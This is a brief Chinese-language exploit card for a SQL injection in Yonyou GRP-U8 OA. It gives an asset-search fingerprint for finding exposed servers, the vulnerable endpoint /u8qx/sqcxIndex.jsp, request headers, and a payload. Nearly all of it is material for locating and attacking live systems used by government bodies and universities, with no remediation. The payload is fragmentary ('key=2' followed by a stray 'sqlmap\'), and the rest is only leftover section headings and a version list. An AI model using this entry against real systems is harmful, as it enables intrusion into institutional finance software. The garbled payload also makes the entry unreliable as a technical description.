# 用友GRP-U8sqcxindexsql注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友GRP-U8 OA"`
- **请求**：`POST /u8qx/sqcxIndex.jsp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
key=2
sqlmap\
```

**其他**
- 用友GRP-U8 sqcxindex sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8 行政事业内控管理软件（新政府会计制度专版）
* 用友GRP-U8 高校内控管理软件（Manager版）